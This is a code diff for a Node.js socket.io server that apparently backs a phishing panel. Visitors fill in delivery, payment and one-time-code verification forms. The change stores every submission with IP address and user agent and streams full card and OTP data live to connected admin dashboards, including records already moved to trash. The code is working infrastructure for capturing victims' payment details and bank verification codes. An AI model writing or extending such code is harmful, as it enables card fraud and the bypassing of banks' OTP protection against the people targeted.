@@ -273,9 +273,22 @@ io.on('connection', (socket) => {
     const { sessionId, formData } = data;
     
     try {
+      // Save to form_submissions table (NEW - keeps all history)
+      await pool.query(
+        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
+        [sessionId, 'delivery', JSON.stringify(formData), ip, userAgent]
+      );
+      
+      // Also update visitors table for current data
       await pool.query(
         'UPDATE visitors SET delivery_data = $1, form_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(formData), sessionId]
+      );
+      
+      // Get all delivery submissions for this visitor (NEW)
+      const submissionsResult = await pool.query(
+        'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
+        [sessionId, 'delivery']
       );
 
       // Get full visitor data
@@ -287,6 +300,7 @@ io.on('connection', (socket) => {
       // Notify admins with FULL visitor data - BROADCAST TO ALL
       const eventData = {
         ...visitorResult.rows[0],
+        delivery_submissions: submissionsResult.rows, // NEW - include all submissions
         timestamp: new Date()
       };
       
@@ -300,7 +314,7 @@ io.on('connection', (socket) => {
       io.emit('form:deliverySubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins`);
+      console.log(`📝 Delivery form submitted by ${sessionId}, broadcasting to ${adminConnections.size + 1} admins (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
       console.error('Error saving delivery data:', error);
     }
@@ -331,9 +345,21 @@ io.on('connection', (socket) => {
         }
       }
 
+      // Save to form_submissions table (NEW - keeps all history)
+      await pool.query(
+        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
+        [sessionId, 'payment', JSON.stringify(finalPaymentData), ip, userAgent]
+      );
+
       await pool.query(
         'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
         [JSON.stringify(finalPaymentData), sessionId]
+      );
+
+      // Get all payment submissions for this visitor (NEW)
+      const submissionsResult = await pool.query(
+        'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
+        [sessionId, 'payment']
       );
 
       // Get full visitor data
@@ -345,6 +371,7 @@ io.on('connection', (socket) => {
       // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة - BROADCAST
       const eventData = {
         ...visitorResult.rows[0],
+        payment_submissions: submissionsResult.rows, // NEW - include all submissions
         timestamp: new Date()
       };
       
@@ -356,7 +383,7 @@ io.on('connection', (socket) => {
       io.emit('form:paymentSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      console.log(`💳 Payment form processed safely for ${sessionId}`);
+      console.log(`💳 Payment form processed safely for ${sessionId} (total submissions: ${submissionsResult.rows.length})`);
     } catch (error) {
       console.error('Error saving payment data:', error);
     }
@@ -399,9 +426,21 @@ io.on('connection', (socket) => {
         }
       }
 
+      // Save to form_submissions table (NEW - keeps all history)
+      await pool.query(
+        'INSERT INTO form_submissions (session_id, form_type, form_data, ip_address, user_agent) VALUES ($1, $2, $3, $4, $5)',
+        [sessionId, 'verification', JSON.stringify(verificationData), ip, userAgent]
+      );
+
       await pool.query(
         'UPDATE visitors SET verification_data = $1, verification_submitted = true, otp_history = $2, last_activity = CURRENT_TIMESTAMP WHERE session_id = $3',
         [JSON.stringify(verificationData), JSON.stringify(otpHistory), sessionId]
+      );
+
+      // Get all verification submissions for this visitor (NEW)
+      const submissionsResult = await pool.query(
+        'SELECT * FROM form_submissions WHERE session_id = $1 AND form_type = $2 ORDER BY created_at DESC',
+        [sessionId, 'verification']
       );
 
       // Get full visitor data
@@ -413,6 +452,7 @@ io.on('connection', (socket) => {
       // Notify admins with FULL visitor data including OTP history - BROADCAST
       const eventData = {
         ...visitorResult.rows[0],
+        verification_submissions: submissionsResult.rows, // NEW - include all submissions
         timestamp: new Date()
       };
       
@@ -424,7 +464,7 @@ io.on('connection', (socket) => {
       io.emit('form:verificationSubmitted', eventData);
       io.emit('visitor:updated', eventData);
 
-      console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}`);
+      console.log(`🔐 Verification submitted by ${sessionId}, OTP History: ${otpHistory.length}, Total submissions: ${submissionsResult.rows.length}`);
     } catch (error) {
       console.error('Error saving verification data:', error);
     }
@@ -467,6 +507,27 @@ io.on('connection', (socket) => {
               'SELECT * FROM visitors WHERE is_deleted = false ORDER BY last_activity DESC LIMIT 100'
             );
             
+            // Get all form submissions for these visitors (NEW)
+            const sessionIds = visitorsResult.rows.map(v => v.session_id);
+            let submissionsMap = {};
+            
+            if (sessionIds.length > 0) {
+              const allSubmissions = await pool.query(`
+                SELECT * FROM form_submissions 
+                WHERE session_id = ANY($1) 
+                ORDER BY created_at DESC
+              `, [sessionIds]);
+              
+              // Group submissions by session_id and form_type
+              allSubmissions.rows.forEach(sub => {
+                const key = `${sub.session_id}_${sub.form_type}`;
+                if (!submissionsMap[key]) {
+                  submissionsMap[key] = [];
+                }
+                submissionsMap[key].push(sub);
+              });
+            }
+            
             const allVisitors = visitorsResult.rows.map(visitor => {
               // Parse JSON fields
               let deliveryData = visitor.delivery_data;
@@ -496,13 +557,17 @@ io.on('connection', (socket) => {
                 payment_data: paymentData || {},
                 verification_data: verificationData || {},
                 otp_history: otpHistory || [],
-                is_online: isOnlineVisitors.has(visitor.session_id)
+                is_online: isOnlineVisitors.has(visitor.session_id),
+                // NEW: Include all form submissions
+                delivery_submissions: submissionsMap[`${visitor.session_id}_delivery`] || [],
+                payment_submissions: submissionsMap[`${visitor.session_id}_payment`] || [],
+                verification_submissions: submissionsMap[`${visitor.session_id}_verification`] || []
               };
             });
             
             // Send all visitors to this admin
             socket.emit('admin:initData', { visitors: allVisitors });
-            console.log(`📊 Sent ${allVisitors.length} visitors to admin`);
+            console.log(`📊 Sent ${allVisitors.length} visitors to admin (with ${sessionIds.length} sessions, ${Object.keys(submissionsMap).length} submission types)`);
             
             // Also send stats
             const statsResult = await pool.query(`
@@ -617,11 +682,42 @@ io.on('connection', (socket) => {
         LIMIT 100
       `);
 
+      // Get all form submissions for these visitors (NEW)
+      const sessionIds = visitors.rows.map(v => v.session_id);
+      let submissionsMap = {};
+      
+      if (sessionIds.length > 0) {
+        const allSubmissions = await pool.query(`
+          SELECT * FROM form_submissions 
+          WHERE session_id = ANY($1) 
+          ORDER BY created_at DESC
+        `, [sessionIds]);
+        
+        // Group submissions by session_id and form_type
+        allSubmissions.rows.forEach(sub => {
+          const key = `${sub.session_id}_${sub.form_type}`;
+          if (!submissionsMap[key]) {
+            submissionsMap[key] = [];
+          }
+          submissionsMap[key].push(sub);
+        });
+      }
+
       // Also get trash count
       const trashCount = await pool.query('SELECT COUNT(*) FROM visitors WHERE is_deleted = true');
 
+      // Attach submissions to each visitor
+      const visitorsWithSubmissions = visitors.rows.map(visitor => {
+        return {
+          ...visitor,
+          delivery_submissions: submissionsMap[`${visitor.session_id}_delivery`] || [],
+          payment_submissions: submissionsMap[`${visitor.session_id}_payment`] || [],
+          verification_submissions: submissionsMap[`${visitor.session_id}_verification`] || []
+        };
+      });
+
       const responseData = { 
-        visitors: visitors.rows,
+        visitors: visitorsWithSubmissions,
         trashCount: parseInt(trashCount.rows[0].count)
       };
       
@@ -644,7 +740,38 @@ io.on('connection', (socket) => {
         LIMIT 100
       `);
 
-      socket.emit('trash:update', { visitors: trashVisitors.rows });
+      // Get all form submissions for these deleted visitors (NEW)
+      const sessionIds = trashVisitors.rows.map(v => v.session_id);
+      let submissionsMap = {};
+      
+      if (sessionIds.length > 0) {
+        const allSubmissions = await pool.query(`
+          SELECT * FROM form_submissions 
+          WHERE session_id = ANY($1) 
+          ORDER BY created_at DESC
+        `, [sessionIds]);
+        
+        // Group submissions by session_id and form_type
+        allSubmissions.rows.forEach(sub => {
+          const key = `${sub.session_id}_${sub.form_type}`;
+          if (!submissionsMap[key]) {
+            submissionsMap[key] = [];
+          }
+          submissionsMap[key].push(sub);
+        });
+      }
+
+      // Attach submissions to each deleted visitor
+      const trashWithSubmissions = trashVisitors.rows.map(visitor => {
+        return {
+          ...visitor,
+          delivery_submissions: submissionsMap[`${visitor.session_id}_delivery`] || [],
+          payment_submissions: submissionsMap[`${visitor.session_id}_payment`] || [],
+          verification_submissions: submissionsMap[`${visitor.session_id}_verification`] || []
+        };
+      });
+
+      socket.emit('trash:update', { visitors: trashWithSubmissions });
       
       console.log('📡 trash:request: returning', trashVisitors.rows.length, 'deleted visitors');
     } catch (error) {
